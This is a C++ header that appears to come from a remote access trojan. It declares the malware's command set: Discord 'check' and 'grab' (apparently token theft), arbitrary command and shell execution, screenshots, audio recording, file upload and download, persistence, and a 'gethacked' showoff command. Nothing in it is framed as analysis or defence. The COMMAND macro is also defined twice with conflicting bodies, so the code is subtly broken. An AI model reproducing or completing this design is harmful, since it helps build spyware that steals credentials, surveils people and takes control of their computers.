#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>
#include <cstdint>
#include <optional>

class Controller;

enum class NavigateCommandEnum {
    ls, cd, pwd, rm
};

enum class AudioCommandEnum {
    start, stop, list
};

enum class DiscordCommandEnum {
    check, grab
};

enum class ShowoffCommandEnum {
    gethacked, hi
};

#define COMMAND(num, name) \
    class name##Command : public Command<num> { \
    public: \
        int execute(Controller&) override; \
    }
#define COMMAND(num, name, ...) \
    class name##Command : public Command<num, __VA_ARGS__> { \
    public: \
        int execute(Controller&, ##__VA_ARGS__) override; \
    }

// navigation.cpp
COMMAND(3, Navigation, uint8_t, const std::string);
// discord.cpp
COMMAND(4, Discord, DiscordCommandEnum);
// exec.cpp
COMMAND(5, Exec, std::string, bool);
// screen.cpp
COMMAND(6, Screenshot);
// audio.cpp
COMMAND(7, Audio, AudioCommandEnum);
// files.cpp
COMMAND(8, DownloadFile, const std::string);
COMMAND(9, UploadFile, const std::string, std::vector<uint8_t>);
// persistence.cpp
COMMAND(10, Persist, const std::string);
// dialog.cpp
COMMAND(11, Dialog, uint32_t, std::string, std::string);
// showoff.cpp
COMMAND(12, Showoff, uint8_t);
// shellexec.cpp
COMMAND(13, ShellExecute, const std::optional<std::string>, const std::optional<std::string>, const std::optional<std::string>, const std::optional<std::string>, const std::optional<int>);

#endif